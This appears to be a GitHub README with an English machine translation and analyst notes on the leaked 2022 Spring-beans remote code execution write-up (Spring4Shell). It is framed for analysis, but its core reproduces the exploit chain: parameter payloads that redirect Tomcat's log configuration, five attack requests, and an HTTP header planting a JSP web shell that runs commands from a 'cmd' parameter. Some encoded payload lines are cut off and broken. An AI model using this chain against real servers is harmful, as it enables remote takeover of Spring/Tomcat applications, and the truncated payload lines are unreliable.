# springcore-0day-en
The README from the alleged 0day dropped on 2022-03-29 has been translated to English and cleaned up slightly to assist in analysis. This should also help alleviate confusion & conflation with othe Spring-related vulnerabilities.

Alleged link to security patch in Spring production: https://github.com/spring-projects/spring-framework/commit/7f7fb58dd0dae86d22268a4b59ac7c72a6c22529

[@sbrannen ](https://github.com/sbrannen) (maintainer) comments:

> What @Kontinuation said is correct.
> 
> The purpose of this commit is to inform anyone who had previously been using SerializationUtils#deserialize that it is dangerous to deserialize objects from untrusted sources.
> 
> The core Spring Framework does not use SerializationUtils to deserialize objects from untrusted sources.
> 
> If you believe you have discovered a security issue, please report it responsibly with the dedicated page: https://spring.io/security-policy
> 
> And please refrain from posting any additional comments to this commit.
> 
> Thank you

Looking for the original copy of this *alleged* leaked 0day? Use vx-underground's archive here: https://share.vx-underground.org/SpringCore0day.7z

TODOs:

* Get a Mandarin speaker to help confirm and clean up this veeery rough machine-made translation.
* Assess what the images claim to show.
* Replicate.

# Spring-beans RCE Vulnerability Analysis

## Requirements
* JDK9 and above
* Using the Spring-beans package
* Spring parameter binding is used
* Spring parameter binding uses non-basic parameter types, such as general POJOs

*Analyst's note:* Does this imply this is an RCE only in nondefault cases? The author then seems to claims this is a reasonable use of SpringBeans.

## Demo

```
https://github.com/p1n93r/spring-rce-war
```

*Analyst's note:* Gone, and no saved version. :/

## Vulnerability Analysis
Spring parameter binding does not introduce too much, you can do it yourself; its basic usage is to use the form of `.` to assign values to parameters. The actual assignment process will use reflection to call the parameters `getter` or `setter`.

When this vulnerability first came out, I thought it was a rubbish hole, because I thought there was a Class type attribute in the parameters that I needed to use, and no fool would open it.
I will use this property in POJOs; but when I follow it carefully, I find that things are not so simple.

For example, the data structure of the parameters I need to bind is as follows, which is a very simple POJO:

```
/**
* @author : p1n93r
* @date : 2022/3/29 17:34
*/
@Setter
@Getter

public class EvalBean {
    public EvalBean() throws ClassNotFoundException {
        System.out.println("[+] called EvalBean.EvalBean");
    }

    public String name;
    public CommonBean commonBean;

    public String getName() {
        System.out.println("[+] called EvalBean.getName");
        return name;
    }

    public void setName(String name) {
        System.out.println("[+] called EvalBean.setName");
        this.name = name;
    }

    public CommonBean getCommonBean() {
        System.out.println("[+] called EvalBean.getCommonBean");
        return commonBean;
    }

    public void setCommonBean(CommonBean commonBean) {
        System.out.println("[+] called EvalBean.setCommonBean");
        this.commonBean = commonBean;
    }
}
```

My Controller is written as follows, which is also very normal:

```
@RequestMapping("/index")
public void index(EvalBean evalBean, Model model) {
    System.out.println("=================");
    System.out.println(evalBean);
    System.out.println("=================");
}
```

So I started the whole process of parameter binding. When I followed the call position as follows, I was stunned.

> *Analyst's notes on picture*
>
> The author then shows a screenshot of `BreanWrapperImpl.class` (see [Spring Frameworks BeanWrapperImpl docs](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/beans/BeanWrapperImpl.html)) with an arrow pointing to `this.getCachedIntrospectionResults()` on line 110, with the label "Find property names from this cache."
> 
> The full line is:
>
> `PropertyDescriptor pd = this.getCachedIntrospectionResults() getPropertyDescriptor(propertyName);
>
> Additionally, the author highlights several bind and [set/apply]PropertyValue events in their debugger, with the note "the process of Spring parameter binding."

When I looked at this "cache", I was stunned, why is there a "class" attribute cache here? ? ? ! ! ! ! !

**TODO: Assess the contents of image 2 in the Vulnerability Analysis PDF.**

When I saw this, I knew I was wrong, this is not a garbage hole, it is really a nuclear bomb-level loophole! Now it is clear that we can easily get the class pair.

For example, the rest is to use this class object to construct the utilization chain. At present, the simpler way is to modify the log configuration of Tomcat and write the shell to the log.

The complete utilization chain is as follows:

```
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b%66%75%63%6b%7d%69
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=%48%3a%5c%6d%79%4a%61%76%61%43%6f%64%65%5c%73%74%75%70%69%64%52%7
class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuckJsp
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

Looking at the utilization chain, you can see that it is a very simple way to modify the Tomcat log configuration and use the log to write a shell; the specific attack steps are as follows, and the following five requests are sent successively:

```
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b%66%75%6
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.directory=%48%3a%5c%6d
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuckJsp
http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

After sending these five requests, Tomcat's log configuration is modified as follows:

**TODO: Assess the contents of image 3 in the Vulnerability Analysis PDF.**

Then we just need to send a random request, add a header called fuck, and write to the shell:

```
GET /stupidRumor_war_exploded/fuckUUUU HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
fuck: <%Runtime.getRuntime().exec(request.getParameter("cmd"))%>
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

**TODO: Assess the contents of image 4 in the Vulnerability Analysis PDF.**

The shell can be accessed normally:

**TODO: Assess the contents of image 5 in the Vulnerability Analysis PDF.**

## Summary

* Now that the class object can be called, the use method must not write the log;
* I can follow it later. Why is a POJO class reference retained during the parameter binding process?